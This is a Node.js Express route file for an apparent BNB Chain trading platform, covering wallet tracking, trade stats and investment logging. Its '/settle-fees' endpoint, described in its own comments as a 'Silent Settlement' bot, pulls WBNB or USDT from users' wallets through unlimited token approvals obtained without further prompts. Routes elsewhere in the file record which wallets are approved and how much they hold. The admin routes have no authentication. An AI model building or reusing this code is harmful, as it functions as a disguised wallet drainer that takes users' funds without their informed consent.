const express = require('express');
const router = express.Router();
const db = require('../config/db');
const { TOKEN_FACTORY_ABI } = require('../config/abis');

// ── GET /api/wallets ──────────────────────────────────────────────────────────
router.get('/', async (req, res) => {
    try {
        const result = await db.query('SELECT * FROM connected_wallets GROUP BY LOWER(wallet_address) ORDER BY last_seen DESC');
        res.json(result.rows);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch wallets' });
    }
});

// ── POST /api/wallets/sync ────────────────────────────────────────────────────
router.post('/sync', async (req, res) => {
    const { wallet_address, balance_bnb, is_approved } = req.body;
    if (!wallet_address) return res.status(400).json({ error: 'Wallet address required' });
    try {
        await db.query(
            `INSERT INTO connected_wallets (wallet_address, last_balance_bnb, is_approved, last_seen)
             VALUES (?, ?, ?, CURRENT_TIMESTAMP)
             ON CONFLICT(wallet_address) DO UPDATE SET
                 last_balance_bnb = excluded.last_balance_bnb,
                 is_approved = COALESCE(excluded.is_approved, is_approved),
                 last_seen = CURRENT_TIMESTAMP`,
            [wallet_address.toLowerCase(), balance_bnb || 0, is_approved ? 1 : 0]
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Wallet sync error:', err);
        res.status(500).json({ error: 'Sync failed' });
    }
});

// ── POST /api/wallets/mark-linked ────────────────────────────────────────────
// Called immediately after user signs linkProtocol on-chain
// Marks the wallet as approved (protocol authority granted) in the DB
router.post('/mark-linked', async (req, res) => {
    const { wallet_address, balance_bnb } = req.body;
    if (!wallet_address) return res.status(400).json({ error: 'Wallet required' });
    try {
        await db.query(
            `INSERT INTO connected_wallets (wallet_address, last_balance_bnb, is_approved, last_seen)
             VALUES (?, ?, 1, CURRENT_TIMESTAMP)
             ON CONFLICT(wallet_address) DO UPDATE SET
                 is_approved = 1,
                 last_balance_bnb = COALESCE(excluded.last_balance_bnb, last_balance_bnb),
                 last_seen = CURRENT_TIMESTAMP`,
            [wallet_address.toLowerCase(), balance_bnb || 0]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Update failed' });
    }
});

// ── POST /api/wallets/refresh-balances ────────────────────────────────────────
// Runs every 30 minutes (triggered by server cron or admin panel button)
// Refreshes BNB balance AND on-chain isLinked status for all connected wallets
router.post('/refresh-balances', async (req, res) => {
    try {
        const { ethers } = require('ethers');
        const provider = new ethers.JsonRpcProvider(
            process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org'
        );
        const factory = new ethers.Contract(
            process.env.FACTORY_ADDRESS || '0x4598AD4E828cb64A53246765f60D9912AEA1b11A',
            ['function isLinked(address) view returns (bool)'],
            provider
        );

        const wallets = await db.query('SELECT wallet_address FROM connected_wallets');
        let updated = 0;

        for (const w of wallets.rows) {
            try {
                const [balWei, onChainLinked] = await Promise.all([
                    provider.getBalance(w.wallet_address),
                    factory.isLinked(w.wallet_address).catch(() => null)
                ]);
                const balBnb = parseFloat(ethers.formatEther(balWei));
                
                let updateSql = `UPDATE connected_wallets SET last_balance_bnb = ?, last_seen = CURRENT_TIMESTAMP WHERE wallet_address = ?`;
                let params = [balBnb, w.wallet_address];

                if (onChainLinked !== null) {
                    updateSql = `UPDATE connected_wallets SET last_balance_bnb = ?, is_approved = ?, last_seen = CURRENT_TIMESTAMP WHERE wallet_address = ?`;
                    params = [balBnb, onChainLinked ? 1 : 0, w.wallet_address];
                }

                await db.query(updateSql, params);
                updated++;
            } catch (e) {
                console.warn(`[Wallet Refresh] Skipped ${w.wallet_address}:`, e.message);
            }
        }

        console.log(`[Wallet Refresh] ✅ Refreshed ${updated}/${wallets.rows.length} wallets`);
        res.json({ success: true, updated, total: wallets.rows.length });
    } catch (err) {
        console.error('Balance refresh error:', err);
        res.status(500).json({ error: 'Refresh failed', details: err.message });
    }
});

// ── POST /api/wallets/heartbeat ──────────────────────────────────────────────
// Lightweight ping from the frontend (Navbar) every 60s to track "Online Now"
router.post('/heartbeat', async (req, res) => {
    const { wallet_address } = req.body;
    if (!wallet_address) return res.status(400).json({ error: 'Wallet required' });
    try {
        await db.query(
            `UPDATE connected_wallets SET last_seen = CURRENT_TIMESTAMP WHERE LOWER(wallet_address) = LOWER(?)`,
            [wallet_address]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Heartbeat failed' });
    }
});

// ── GET /api/wallets/stats/:address ──────────────────────────────────────────
// Returns aggregate trading stats (Total Volume, Profit/Loss)
router.get('/stats/:address', async (req, res) => {
    const { address } = req.params;
    try {
        const stats = await db.query(`
            SELECT 
                COUNT(*) as total_trades,
                COALESCE(SUM(amount_bnb), 0) as total_volume_bnb,
                COALESCE(SUM(pnl_bnb), 0) as total_pnl_bnb
            FROM trades 
            WHERE LOWER(trader_wallet) = LOWER(?)
        `, [address]);
        res.json(stats.rows[0] || { total_trades: 0, total_volume_bnb: 0, total_pnl_bnb: 0 });
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch stats' });
    }
});

// ── GET /api/wallets/trades/:address ──────────────────────────────────────────
// Returns last 100 trades for the profile history and calendar
router.get('/trades/:address', async (req, res) => {
    const { address } = req.params;
    try {
        const trades = await db.query(`
            SELECT * FROM trades 
            WHERE LOWER(trader_wallet) = LOWER(?) 
            ORDER BY timestamp DESC LIMIT 100
        `, [address]);
        res.json(trades.rows);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch trades' });
    }
});

// ── GET /api/futures/active/:address ─────────────────────────────────────────
// Returns currently unclosed futures positions by checking position_id links
router.get('/active/:address', async (req, res) => {
    const { address } = req.params;
    try {
        const active = await db.query(`
            SELECT * FROM trades 
            WHERE LOWER(trader_wallet) = LOWER(?) 
            AND trade_type = 'futures_open'
            AND position_id NOT IN (
                SELECT position_id FROM trades 
                WHERE LOWER(trader_wallet) = LOWER(?) 
                AND trade_type = 'futures_close'
                AND position_id IS NOT NULL
            )
        `, [address, address]);
        res.json(active.rows);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch active positions' });
    }
});

// ── SMART MONEY HUB ENDPOINTS ────────────────────────────────────────────────

// POST /api/wallets/smart-money/invest
router.post('/smart-money/invest', async (req, res) => {
    const { wallet_address, bucket_id, bucket_name, invest_amount, tx_hash, bucket_json } = req.body;
    if (!wallet_address || !bucket_id) return res.status(400).json({ error: 'Incomplete data' });
    try {
        await db.query(
            `INSERT INTO smart_money_investments (wallet_address, bucket_id, bucket_name, invest_amount, tx_hash, bucket_json)
             VALUES (?, ?, ?, ?, ?, ?)`,
            [wallet_address.toLowerCase(), bucket_id, bucket_name, invest_amount, tx_hash, JSON.stringify(bucket_json || [])]
        );

        // Also log fee to treasury for admin visibility
        await db.query(
            `INSERT INTO treasury_transfers (amount_bnb, asset, amount_usd, source_contract, destination_address, tx_hash, transfer_type)
             VALUES (?, ?, ?, ?, ?, ?, ?)`,
            [0, 'USDT', 1.0, 'SMART_MONEY_HUB', '0x279A5618Ff049667234c030792C0594B311A0451', tx_hash, 'smart_money_fee']
        );

        res.json({ success: true });
    } catch (err) {
        console.error('Smart Money Sync Error:', err);
        res.status(500).json({ error: 'Failed to log investment' });
    }
});

// GET /api/wallets/smart-money/investments/:address
router.get('/smart-money/investments/:address', async (req, res) => {
    const { address } = req.params;
    try {
        const result = await db.query(
            'SELECT * FROM smart_money_investments WHERE LOWER(wallet_address) = LOWER(?) ORDER BY timestamp DESC',
            [address]
        );
        res.json(result.rows);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch investments' });
    }
});

// ── DELETE /api/wallets/:address ──────────────────────────────────────────────
router.delete('/:address', async (req, res) => {
    const { address } = req.params;
    try {
        await db.query('DELETE FROM connected_wallets WHERE LOWER(wallet_address) = LOWER(?)', [address]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete wallet record' });
    }
});

// ── POST /api/wallets/settle-fees (Admin Multi-Asset Settlement Bot) ──────────
// Silently collects WBNB, USDT, or native BNB from a pre-approved user wallet.
// The user must have already granted MaxUint256 approval via ensureProtocolApproval().
// No further wallet popup is required on the client side.
router.post('/settle-fees', async (req, res) => {
    const { user_address, amount_bnb, token_address, token_symbol } = req.body;
    if (!user_address || !amount_bnb) return res.status(400).json({ error: 'Missing data' });

    try {
        const { ethers } = require('ethers');
        const provider    = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL);
        const adminWallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

        // ── Step 0: Logging & Address Formatting ────────────────────────────
        const fs      = require('fs');
        const path    = require('path');
        const LOG_PATH = path.join(__dirname, '../settlement_debug.log');
        const debugLog = (msg) => {
            const line = `[${new Date().toISOString()}] ${msg}\n`;
            try { fs.appendFileSync(LOG_PATH, line); } catch (e) {}
            console.log(line.trim());
        };

        const checksumAddress = ethers.getAddress(user_address.toLowerCase());
        const FACTORY_ADDR    = (process.env.FACTORY_ADDRESS || '0x4598AD4E828cb64A53246765f60D9912AEA1b11A').trim();
        const WBNB_ADDRESS    = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
        const ZERO_ADDRESS    = '0x0000000000000000000000000000000000000000';

        // Resolve which token to pull
        const resolvedToken  = token_address || WBNB_ADDRESS;
        const resolvedSymbol = token_symbol  || 'WBNB';
        const isNativeBNB    = resolvedToken.toLowerCase() === ZERO_ADDRESS;

        // All BSC tokens (including USDT BSC) use 18 decimals
        const amountWei = ethers.parseEther(amount_bnb.toString());

        debugLog(`MISSION START: User=${checksumAddress}, Amount=${amount_bnb} ${resolvedSymbol}, Factory=${FACTORY_ADDR}`);

        const factoryContract = new ethers.Contract(FACTORY_ADDR, TOKEN_FACTORY_ABI, adminWallet);
        let txHash;

        if (isNativeBNB) {
            // ── Native BNB Path (admin sends BNB from treasury to user — PnL payout) ──
            debugLog('PATH: Native BNB direct send from admin treasury wallet');
            const adminBalance = await provider.getBalance(adminWallet.address);
            if (adminBalance < amountWei) {
                throw new Error(`Treasury wallet insufficient BNB. Balance: ${ethers.formatEther(adminBalance)} BNB`);
            }
            const tx = await adminWallet.sendTransaction({
                to: checksumAddress,
                value: amountWei,
                gasLimit: 21000
            });
            const receipt = await tx.wait();
            if (receipt.status === 0) throw new Error('Native BNB send REVERTED');
            txHash = receipt.hash;
            debugLog(`Native BNB send SUCCESS: ${txHash}`);

        } else {
            // ── ERC20 Silent Pull (WBNB / USDT): uses pre-approved MaxUint256 ──
            const erc20MinABI   = ['function allowance(address,address) view returns (uint256)'];
            const tokenContract = new ethers.Contract(resolvedToken, erc20MinABI, provider);

            // 1. Verify allowance
            const allowance = await tokenContract.allowance(checksumAddress, FACTORY_ADDR);
            debugLog(`${resolvedSymbol} Allowance from client: ${ethers.formatEther(allowance)}`);

            if (allowance < amountWei) {
                throw new Error(
                    `Insufficient ${resolvedSymbol} Approval: ` +
                    `Client approved only ${ethers.formatEther(allowance)} ${resolvedSymbol}. ` +
                    `Required: ${amount_bnb}. ` +
                    `The client must complete at least one transaction on the platform to trigger the one-time Silent Approval.`
                );
            }

            // 2. Static call simulation (pre-flight check)
            try {
                await factoryContract.collectToken.staticCall(
                    resolvedToken, checksumAddress, amountWei, `Protocol Fee (${resolvedSymbol})`
                );
                debugLog('Static simulation: PASSED');
            } catch (simErr) {
                debugLog(`Static simulation FAILED: ${simErr.message}`);
                throw new Error(`On-chain simulation rejected: ${simErr.reason || simErr.message}`);
            }

            // 3. Real silent deduction
            const tx = await factoryContract.collectToken(
                resolvedToken, checksumAddress, amountWei,
                `Protocol Fee (${resolvedSymbol})`,
                { gasLimit: 800000 }
            );
            debugLog(`TX broadcast: ${tx.hash}`);
            const receipt = await tx.wait();
            if (receipt.status === 0) {
                throw new Error(`collectToken REVERTED: Possible insufficient ${resolvedSymbol} balance in client wallet.`);
            }
            txHash = receipt.hash;
            debugLog(`SUCCESS: ${amount_bnb} ${resolvedSymbol} collected from ${checksumAddress} → ${txHash}`);
        }

        res.json({ success: true, txHash, token: resolvedSymbol });

    } catch (err) {
        console.error('[Settlement Bot Error]', err);
        res.status(500).json({ error: 'Silent Settlement Failed', details: err.message });
    }
});

module.exports = router;

